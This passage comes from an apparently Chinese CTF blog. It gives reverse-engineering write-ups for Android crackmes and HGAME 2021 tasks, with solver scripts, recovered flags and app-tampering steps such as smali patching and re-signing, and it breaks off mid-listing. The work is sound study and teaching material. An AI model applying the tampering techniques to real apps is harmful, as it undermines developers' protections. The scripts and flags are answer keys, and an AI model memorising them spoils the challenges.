title="Illusion"></a>Illusion</h3><p>关键就在so层的一个加密函数，开始直接在Exports找到名称为CheckFlag的函数，为了熟悉一下so层的调试，在这个函数下了断点但每次都不断不下来。。</p><p>然后开始找原因，后面发现这个假的函数，真正是动态加载的。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203021780.png" alt="image-20210303203021780"></p><p>进入正确的函数开始分析，函数的伪代码明显是有点问题的，看arm汇编就好了。</p><p>其中关键就是<strong>sub_CCB09028</strong>这个函数：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303203358493.png" alt="image-20210303203358493"></p><p>分析了一下没看出所以然，但这个是一位一位加密的，所以可以直接穷举的。</p><p>写ida-python，但这个穷举最后一位有2个字符都可，空格和‘}’，还好是最后一位，那肯定是字符}了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">"Ku@'G_V9v(yGS"</span></span><br><span class="line">s = <span class="string">'(Ljava/lang/String;Ljava/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a1, a2)</span>:</span></span><br><span class="line">    v3 = <span class="number">1</span></span><br><span class="line">    v4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 &gt;= a2:  </span><br><span class="line">        <span class="keyword">while</span> a2 &lt; a1:</span><br><span class="line">            a2 *= <span class="number">16</span></span><br><span class="line">            v3 *= <span class="number">16</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2:</span><br><span class="line">                a1 -= a2</span><br><span class="line">                v4 |= v3</span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">1</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">1</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">2</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">2</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> a1 &gt;= a2 &gt;&gt; <span class="number">3</span>:</span><br><span class="line">                a1 -= a2 &gt;&gt; <span class="number">3</span></span><br><span class="line">                v4 |= v3 &gt;&gt; <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> a1 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            v3 &gt;&gt;= <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> v3 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            a2 &gt;&gt;= <span class="number">4</span>      </span><br><span class="line">    <span class="keyword">return</span> v4</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        r1 = j+ord(s[i])<span class="number">-64</span></span><br><span class="line">        r2 = <span class="number">0x5d</span></span><br><span class="line">        <span class="keyword">if</span> r1 - fun(r1, r2)*<span class="number">0x5d</span> + <span class="number">0x20</span> == ord(enc[i]):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag.encode())</span><br><span class="line"><span class="comment">#CISCN&#123;GJ5728&#125;</span></span><br></pre></td></tr></table></figure><p>写完仔细分析了下那个函数，其实该函数和后面对函数返回值的处理就是<strong>求模（mod）</strong>的操作，但没有使用/与mod，可以学习一下。这从最后的操作看其实很明显。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210303204003498.png" alt="image-20210303204003498"></p><h3 id="APK逆向-2"><a href="#APK逆向-2" class="headerlink" title="APK逆向-2"></a>APK逆向-2</h3><p>首先安装app失败。。</p><p>反编译后首先看了一下<strong>AndroidManifest.xml</strong>，发现空的。。然后看了app的主要逻辑和类，很乱和杂吧，也不清楚要做什么。。</p><p>然后我为了看其中的一个资源文件对app进行了直接解压，这个倒是没看出什么。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192508917.png" alt="image-20210304192508917"></p><p>但在其中看到<strong>AndroidManifest.xml</strong>并不是空的，然后尝试使用apktool对apk解包，解包失败。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304192711623.png" alt="image-20210304192711623"></p><p>由此可以知道，应该是对<strong>AndroidManifest.xml</strong>文件做了手脚。</p><p>然后就是要知道安卓<strong>AndroidManifest.xml</strong>文件格式了，这是修改过的。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193133042.png" alt="image-20210304193133042"></p><p>再看一个正常的：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210304193230661.png" alt="image-20210304193230661"></p><p>通过修复后，重新压缩成压缩包，在xml文件中看到flag相关：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/H1aGYAcMoEPShpW.png" alt="image-20210304193456601"></p><h3 id="ill-intentions"><a href="#ill-intentions" class="headerlink" title="ill-intentions"></a>ill-intentions</h3><p>在MainActivity中注册了一个广播接收器：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193418021.png" alt="image-20210305193418021"></p><p>根据在设置在屏幕上的文本来看Send_to_Activity，就是根据接受到的不同广播消息执行不同的函数。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305193507242.png" alt="image-20210305193507242"></p><p>然后看了一下三个不同的函数，其执行逻辑其实是一样的，把3个指定字符串经过sha224与base64及替换加密后再经过so层函数的操作，最后把结果以广播形式发出，但这里并不是发送给Send_to_Activity。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305213542600.png" alt="image-20210305213542600"></p><p>so层的加密操作一个异或，能想到运算结果就是我们要的flag。</p><p>由于只有三种结果，用ida-python模拟了程序的运算逻辑，在IsThisTheRealOne活动得到flag。这里开始一直出错得不到结果，后面调试发现是getClass().getName()得到的类名我没有把整个包加上。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha224</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = [<span class="string">'e'</span>, <span class="string">'W'</span>, <span class="string">'h'</span>, <span class="string">'a'</span>, <span class="string">'t'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'d'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = sha224(s.encode()).hexdigest().encode()</span><br><span class="line">    s = base64.b64encode(s).decode().replace(<span class="string">'='</span>, <span class="string">'?'</span>)</span><br><span class="line">    s = list(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        temp = ord(s[i])</span><br><span class="line">        <span class="keyword">if</span>  temp &gt; <span class="number">47</span> <span class="keyword">and</span> temp &lt; <span class="number">58</span>:</span><br><span class="line">            s[i] = a[temp<span class="number">-48</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s)</span><br><span class="line">    </span><br><span class="line">s1 = <span class="string">b'TRytfrgooq|F&#123;i-JovFBungFk'</span>+<span class="string">b'\\VlphgQbwvj~HuDgaeTzuSt.@Lex^~'</span></span><br><span class="line">s1 = list(s1) + [<span class="number">119</span>, <span class="number">110</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">123</span>, <span class="number">79</span>, <span class="number">117</span>, </span><br><span class="line">  <span class="number">116</span>, <span class="number">98</span>, <span class="number">104</span>, <span class="number">127</span>, <span class="number">114</span>, <span class="number">67</span>] + list(<span class="string">b'tfqm&#125;'</span>)</span><br><span class="line">s2 = <span class="string">'SendAnIntentApplication'</span></span><br><span class="line">s3 = <span class="string">'com.example.application.IsThisTheRealOne$1'</span></span><br><span class="line">s3 = s3[<span class="number">0</span>:len(s3)<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">s2 = en(s2).encode()</span><br><span class="line">s3 = en(s3).encode()</span><br><span class="line">print(<span class="string">'---------------------------------------------------'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">76</span>):</span><br><span class="line">    print(chr(s1[i]^s2[i]^s3[i]), end = <span class="string">''</span>)</span><br><span class="line"><span class="comment">#Congratulation!YouFoundTheRightActivityHereYouGo-CTF&#123;IDontHaveABadjokeSorry&#125;</span></span><br></pre></td></tr></table></figure><p>另外，由于app中是多个活动，开始我是想直接用adb命令来启动每个活动，通过调试看输出是什么，但都启动失败，什么权限禁止。通过计算得到flag后，通过搜集发现是要对活动没有指定属性<strong>android:exported=”true”</strong>，</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305222644097.png" alt="image-20210305222644097"></p><blockquote><p><strong>android.intent.action.MAIN：决定应用的入口Activity，也就是我们启动应用时首先显示哪一个Activity。</strong><br><strong>android.intent.category.LAUNCHER：表示activity应该被列入系统的启动器(launcher)(允许用户启动它)。Launcher是安卓系统中的桌面启动器，是桌面UI的统称。</strong></p></blockquote><p>指定后通过adb命令启动成功，可直接通过调试查看生成的字符串，我尝试修改smali来插入打印Log的语句，然后同伙查看日志同样得到flag。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223009728.png" alt="image-20210305223009728"></p><p>最后查看日志：<br><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210305223046697.png" alt="image-20210305223046697"></p><h2 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h2><h3 id="No-Name"><a href="#No-Name" class="headerlink" title="No Name"></a>No Name</h3><p>找到入口活动，将输入传入FlagChecker类的checkFlag函数，然后又是实现接口中的check函数，最后调用，感觉有点套娃，，实质就是调用native层的check函数。。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310201450601.png" alt="image-20210310201450601"></p><p>但是注意清单文件中application中的android:name属性：这里指定了<strong>app启动时关联的一个application，这个类的作用就是做一些初始化，放一些全局变量和程序上下文相关的东西</strong>，默认是android.app.Application。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203122424.png" alt="image-20210310203122424"></p><p>来到app启动时指定的这个类：NoNameApp。比较简单的代码，就是得到资源文件data.enc然后获取一个aeskey对其进行aes解密，且这里指定的解密得到的文件和存放路径。然后进行dex加载并把FlagChecker中mFlagChecker的实例进行了替换，也就是把上面我们分析出的native层那个check函数进行了替换。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310203554497.png" alt="image-20210310203554497"></p><p>所以可以知道app真正检查的逻辑在解密出的jar文件中，现在的目的就是得到这个jar，首先想到的就是直接在程序运行后在指定的路径下去找。</p><p>虽然app在加载完解密后对解密出的文件进行了删除，但是可以将app的smali修改，删除<strong>file.delete()；</strong>后对其重新打包然后签名。</p><p>这里签名完后安装遇到了问题，一个是之前知道的app有<strong>android:testOnly=”true”</strong>，解决办法：1.安装时加上-t选项。2.在清单文件中删除该属性。</p><p>第二个问题：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310204857678.png" alt="image-20210310204857678"></p><p>搜索到这篇文章 <a href="https://testerhome.com/topics/18463" target="_blank" rel="noopener">https://testerhome.com/topics/18463</a></p><blockquote><p>如果 AndroidManifest.xml 中未设置 extractNativeLibs=true，使用 apktool 反编译时有可能导致 extractNativeLibs 被设置为 false。</p></blockquote><p>至于extractNativeLibs属性，开启的话就是把apk中的so解压缩提取到本地存取一份，关闭的话不在本地存储一份，在运行时直接调用app中的so。</p><p>如果关闭的话，且我们apk是未对齐或so文件是压缩状态的话将阻止我们安装apk，也就是上面的报的错。</p><p><strong>然后导致我们默认开启extractNativeLibs的属性关闭的原因：使用apktool对app进行反编译和回编译。</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310205935229.png" alt="image-20210310205935229"></p><p>最后把这个属性改为true，回编译签名后，运行app，在data/data/包名/下得到解密出的jar文件，简单的异或。。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210138830.png" alt="image-20210310210138830"></p><p>最后说一下，在AK中反编译apk遇到<strong>com.googlecode.d2j.DexException: not support version</strong>的问题。</p><p>这个是dex2jar版本与dex版本不兼容主动抛出的异常，从报错找到dex-reader-2.1-20190905-lanchon.jar文件中的DexFileReader函数，看源码。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210310210853842.png" alt="image-20210310210853842"></p><p>解决办法，更换最新的dex2jar版本就好了。<a href="https://www.jianshu.com/p/55bf5f688e9a" target="_blank" rel="noopener">https://www.jianshu.com/p/55bf5f688e9a</a></p>]]></content>
      
      
      <categories>
          
          <category> Andriod </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021</title>
      <link href="/2021/02/04/HGAME%202021/"/>
      <url>/2021/02/04/HGAME%202021/</url>
      
        <content type="html"><![CDATA[<p>一个月hgame结束了，做完了逆向题。<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h3><p>考了一个xxtea加密算法：key是{1, 2, 3, 4}</p><p><img src="https://i.loli.net/2021/02/27/imfSALBWP2nDy7o.png" alt="image-20210204180727273"></p><p>跟着算法逻辑逆一下就行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> LEN = <span class="number">35</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x9E3779B9</span> * (<span class="number">52</span> / LEN) - <span class="number">0x4AB325AA</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> KEY[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">35</span>, <span class="number">179</span>,  <span class="number">78</span>, <span class="number">231</span>,  <span class="number">54</span>,  <span class="number">40</span>, <span class="number">167</span>, <span class="number">183</span>, <span class="number">226</span>, <span class="number">111</span>, </span><br><span class="line">  <span class="number">202</span>,  <span class="number">89</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">124</span>, <span class="number">150</span>, <span class="number">116</span>,  <span class="number">38</span>, <span class="number">128</span>, <span class="number">231</span>, </span><br><span class="line">  <span class="number">230</span>,  <span class="number">84</span>,  <span class="number">45</span>,  <span class="number">61</span>,  <span class="number">86</span>,   <span class="number">3</span>, <span class="number">157</span>, <span class="number">138</span>, <span class="number">156</span>, <span class="number">195</span>, </span><br><span class="line">  <span class="number">220</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">216</span>,  <span class="number">38</span>, <span class="number">112</span>, <span class="number">173</span>, <span class="number">253</span>,  <span class="number">51</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">85</span>, <span class="number">150</span>, <span class="number">244</span>, <span class="number">158</span>, <span class="number">111</span>, <span class="number">156</span>,  <span class="number">92</span>,  <span class="number">76</span>, <span class="number">208</span>, </span><br><span class="line">  <span class="number">229</span>,  <span class="number">27</span>,  <span class="number">23</span>, <span class="number">174</span>,  <span class="number">35</span>, <span class="number">103</span>, <span class="number">194</span>, <span class="number">165</span>, <span class="number">112</span>,  <span class="number">82</span>, </span><br><span class="line">   <span class="number">10</span>,  <span class="number">19</span>,  <span class="number">66</span>, <span class="number">172</span>, <span class="number">178</span>, <span class="number">103</span>, <span class="number">190</span>, <span class="number">132</span>, <span class="number">121</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">92</span>, <span class="number">112</span>, <span class="number">152</span>,  <span class="number">61</span>,  <span class="number">81</span>,  <span class="number">92</span>,  <span class="number">45</span>, <span class="number">218</span>,  <span class="number">54</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">150</span>,  <span class="number">23</span>,  <span class="number">34</span>, <span class="number">157</span>,  <span class="number">82</span>, <span class="number">227</span>,  <span class="number">92</span>, <span class="number">251</span>, <span class="number">225</span>, </span><br><span class="line">  <span class="number">137</span>, <span class="number">209</span>, <span class="number">137</span>, <span class="number">212</span>,  <span class="number">91</span>, <span class="number">232</span>,  <span class="number">31</span>, <span class="number">209</span>, <span class="number">200</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">150</span>, <span class="number">193</span>, <span class="number">181</span>,  <span class="number">84</span>, <span class="number">144</span>, <span class="number">180</span>, <span class="number">124</span>, <span class="number">182</span>, <span class="number">202</span>, <span class="number">228</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">33</span>, <span class="number">148</span>, <span class="number">249</span>, <span class="number">227</span>, <span class="number">157</span>, <span class="number">170</span>, <span class="number">161</span>,  <span class="number">90</span>,  <span class="number">47</span>, </span><br><span class="line">  <span class="number">253</span>,   <span class="number">1</span>, <span class="number">232</span>, <span class="number">167</span>, <span class="number">171</span>, <span class="number">110</span>,  <span class="number">13</span>, <span class="number">195</span>, <span class="number">156</span>, <span class="number">220</span>, </span><br><span class="line">  <span class="number">173</span>,  <span class="number">27</span>,  <span class="number">74</span>, <span class="number">176</span>,  <span class="number">83</span>,  <span class="number">52</span>, <span class="number">249</span>,   <span class="number">6</span>, <span class="number">164</span>, <span class="number">146</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ENC;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *key = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)KEY;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> delat1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(delat &gt;&gt; <span class="number">2</span>);</span><br><span class="line">enc[LEN<span class="number">-1</span>] -= ((key[((LEN<span class="number">-1</span>)^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-2</span>])+(enc[<span class="number">0</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[LEN<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = LEN<span class="number">-2</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">enc[i] -= ((key[(i^delat1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">i--; </span><br><span class="line">&#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^delat1)&amp;<span class="number">3</span>]^enc[LEN<span class="number">-1</span>])+(enc[<span class="number">1</span>]^delat)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[LEN<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[LEN<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">delat += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(delat != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">de_xxtea();</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, ENC[i*<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;l00ks_1ike_y0u_f0Und_th3_t34&#125;</span></span><br></pre></td></tr></table></figure><h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>就是一个异或解密，但是可以从这里学习一下STL模板中的string的结构。</p><p>能猜测出v14就是我们输入字符串的长度，但是怎么来的呢？其实使用了string结构。</p><p><img src="https://i.loli.net/2021/02/27/IbUASK8JgpGLFr6.png" alt="image-20210204182522063"></p><p>string结构：一共占24个字节（这也是一个可以让我们用来识别的特征）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">string</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> _Buf[<span class="number">16</span>];           <span class="comment">// 当字符串长度小于等于0xF时，数据存储在_Buf数组中</span></span><br><span class="line">                             <span class="comment">// 大于0xF时将分配一个变量，_Buf存储的是该变量地址。</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Mysize;    <span class="comment">// 字符串长度</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _Myres;     <span class="comment">// 可存储的最大长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来测试一个输入看看：</p><p><img src="https://i.loli.net/2021/02/27/zMNw8FvRtLHaGPT.png" alt="image-20210204182822594"></p><p>最后题解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">addr = <span class="number">0x07FF756E13480</span></span><br><span class="line">cnt = <span class="number">0xff</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">    flag += chr(get_byte(addr)^cnt)</span><br><span class="line">    cnt -= <span class="number">1</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#hgame&#123;hello_re_player&#125;</span></span><br></pre></td></tr></table></figure><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>给了通过dis模块得到的python反汇编代码，我把对应的python代码注释了下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 